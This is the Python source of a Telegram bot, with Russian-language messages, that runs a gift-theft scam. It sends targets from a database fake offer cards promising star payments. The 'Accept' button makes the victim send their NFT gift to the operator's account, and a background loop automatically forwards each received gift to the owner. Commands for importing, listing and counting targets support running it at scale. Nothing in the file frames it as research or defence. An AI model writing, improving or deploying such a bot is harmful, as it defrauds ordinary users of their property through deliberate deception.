import asyncio, os, random, secrets
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import (Message, InlineKeyboardMarkup, InlineKeyboardButton,
                           BusinessConnection)
from aiogram.client.default import DefaultBotProperties
import json
import db

TOKEN = os.environ["BOT_TOKEN"]
OWNER = int(os.environ["OWNER_ID"])
ALLOWED = {int(x) for x in os.environ.get("ALLOWED_USERS", "").split(",") if x.strip()} | {OWNER}
TARGET_USERNAME = os.environ["TARGET_USERNAME"]      

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

db.init()

STAR_ID = "5368324170671202286"   

def is_allowed(m: Message) -> bool:
    return m.from_user is not None and m.from_user.id in ALLOWED

async def get_bc() -> str | None:
    bc = db.get_setting("bc_id")
    if not bc:
        return None
    try:
        info = await bot.get_business_connection(bc)
    except Exception:
        return None
    return bc if info.is_enabled else None

def card_kb():
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✖️ Отклонить", url=f"tg://resolve?domain={TARGET_USERNAME}"),
        InlineKeyboardButton(text="✅ Принять", url=f"tg://send_gift?to={TARGET_USERNAME}"),
    ]])

def card_text(title: str, num: int, price: int) -> str:
    return (f"Пользователь <b>{TARGET_USERNAME}</b> предлагает Вам {price} "
            f'<tg-emoji emoji-id="{STAR_ID}">💎</tg-emoji> '
            f"за подарок <b>{title} #{num}</b>.\n\n"
            f"Подтверди передачу — звёзды зачислятся автоматически.")

async def send_card(chat_id, title, num, price, slug, photo_file_id=None, bc=None):
    kw = {"business_connection_id": bc} if bc else {}
    code = secrets.token_hex(4)

    await bot.send_message(chat_id, "👋", **kw)
    await bot.send_message(chat_id, f"/of {code}", **kw) 
    
    photo = photo_file_id if photo_file_id else f"https://t.me/nft/{slug}"
    
    return await bot.send_photo(chat_id, photo,
                                caption=card_text(title, num, price),
                                reply_markup=card_kb(), **kw)

@dp.business_connection()
async def on_bc(conn: BusinessConnection):
    if not conn.is_enabled:
        db.set_setting("bc_id", "")
        return
    db.set_setting("bc_id", conn.id)
    rights = conn.rights
    db.log(f"bc {conn.id} rights={rights}")
    miss = []
    if not rights.can_transfer_and_upgrade_gifts:
        miss.append("can_transfer_and_upgrade_gifts")
    if not rights.can_transfer_stars:
        miss.append("can_transfer_stars")
    if miss:
        await bot.send_message(OWNER, "⚠️ Не хватает прав: " + ", ".join(miss))
    else:
        await bot.send_message(OWNER, "✅ Бизнес-подключение активно, права на месте.")

@dp.business_message()
async def on_business(m: Message):
    if m.text and m.text.startswith("/of"):
        return
    db.log(f"business msg from {m.chat.id}: {(m.text or '')[:80]}")

@dp.message(Command("emoji"))
async def grab(m: Message):
    if not is_allowed(m) or not m.reply_to_message:
        return
    for e in (m.reply_to_message.entities or []):
        if e.type == "custom_emoji":
            await m.reply(f"id: {e.custom_emoji_id}")

@dp.message(Command("of"))
async def of_check(m: Message):
    if m.chat.id == OWNER:
        return
    await m.reply("Оффер действителен 24 часа. "
                  "Нажмите «Принять», чтобы передать подарок.")

@dp.message(Command("start"))
async def start(m: Message):
    if not is_allowed(m):
        return
    bc = await get_bc()
    await m.reply("Бот готов.\nБизнес-режим: " + ("активен" if bc else "НЕ активен") +
                  "\n\n/next 20 — карточка на случайную цель\n/list /stats /add /import")

@dp.message(Command("next"))
async def nxt(m: Message):
    if not is_allowed(m):
        return
    bc = await get_bc()
    if not bc:
        return await m.reply("Бизнес-режим не активен: подключи бота в Telegram Business.")

    a = m.text.split()
    price = int(a[1]) if len(a) > 1 and a[1].isdigit() else None

    with db.conn() as c:
        row = c.execute("SELECT * FROM targets WHERE status='new' "
                        "ORDER BY RANDOM() LIMIT 1").fetchone()
    if not row:
        return await m.reply("База пуста: /add @user или /import")

    p = price or row["price"] or 20
    try:
        photo_id = row["photo_file_id"] if "photo_file_id" in row.keys() else None
        sent = await send_card(row["user_id"] or row["username"], row["title"],
                               row["num"], p, row["slug"], 
                               photo_file_id=photo_id, bc=bc)
    except Exception as e:
        db.log(f"send fail {row['username']}: {e}")
        return await m.reply(f"Не отправилось @{row['username']}: {e}\n"
                             "Если это первый контакт — нужен открытый чат.")

    with db.conn() as c:
        c.execute("UPDATE targets SET status='sent' WHERE id=?", (row["id"],))
        c.execute("INSERT INTO offers(ts, target_id, business_connection_id, chat_id, message_id) "
                  "VALUES (strftime('%s','now'),?,?,?,?)",
                  (row["id"], bc, sent.chat.id, sent.message_id))
    await m.reply(f"→ @{row['username']} за {p} 💎")

@dp.message(Command("add"))
async def add(m: Message):
    if not is_allowed(m):
        return
    n = 0
    with db.conn() as c:
        for u in m.text.split()[1:]:
            try:
                c.execute("INSERT OR IGNORE INTO targets(username, title, num, slug) "
                          "VALUES (?,?,?,?)", (u.lstrip("@"), "PlushPepe", 0, "PlushPepe-1"))
                n += 1
            except Exception:
                pass
    await m.reply(f"добавлено {n} (название/номер поправь через /import)")

@dp.message(Command("import"))
async def imp(m: Message):
    if not is_allowed(m):
        return
    data = json.loads(m.text.split("\n", 1)[1])
    n = 0
    with db.conn() as c:
        for d in data:
            c.execute("INSERT OR IGNORE INTO targets(username,user_id,title,num,slug,price) "
                      "VALUES (?,?,?,?,?,?)",
                      (d["username"], d.get("user_id"), d.get("title"), d.get("num"),
                       d.get("slug"), d.get("price", 20)))
            n += 1
    await m.reply(f"загружено {n}")

@dp.message(Command("list"))
async def lst(m: Message):
    if not is_allowed(m):
        return
    with db.conn() as c:
        rows = c.execute("SELECT username,title,num,status FROM targets LIMIT 40").fetchall()
    await m.reply("\n".join(f"@{r['username']} — {r['title']} #{r['num']} [{r['status']}]"
                            for r in rows) or "пусто")

@dp.message(Command("stats"))
async def stats(m: Message):
    if not is_allowed(m):
        return
    with db.conn() as c:
        t = c.execute("SELECT COUNT(*) n FROM targets").fetchone()["n"]
        s = c.execute("SELECT COUNT(*) n FROM targets WHERE status='sent'").fetchone()["n"]
        g = c.execute("SELECT COUNT(*) n FROM gifts_seen").fetchone()["n"]
    await m.reply(f"целей: {t}\nотправлено: {s}\nпришло подарков: {g}")

async def collector():
    baseline_done = False
    while True:
        try:
            bc = await get_bc()
            if bc:
                res = await bot.get_business_account_gifts(
                    business_connection_id=bc, exclude_unsaved=False, limit=100)
                for g in res.gifts:
                    uid = getattr(g, "owned_gift_id", None)
                    if not uid:
                        continue
                    with db.conn() as c:
                        new = not c.execute("SELECT 1 FROM gifts_seen WHERE owned_gift_id=?",
                                            (uid,)).fetchone()
                        c.execute("INSERT OR IGNORE INTO gifts_seen(owned_gift_id) VALUES (?)", (uid,))
                    if not new or not baseline_done:
                        continue
                    await bot.transfer_gift(
                        business_connection_id=bc,
                        owned_gift_id=uid,
                        new_owner_chat_id=OWNER,
                        star_count=getattr(g, "transfer_star_count", 0) or 0)
                    db.log(f"transferred {uid}")
                    await bot.send_message(OWNER, f"🎁 подарок {uid} переведён")
                baseline_done = True
        except Exception as e:
            db.log(f"collector: {e}")
        await asyncio.sleep(60)

async def main():
    await bot.delete_webhook(drop_pending_updates=True)
    asyncio.create_task(collector())
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
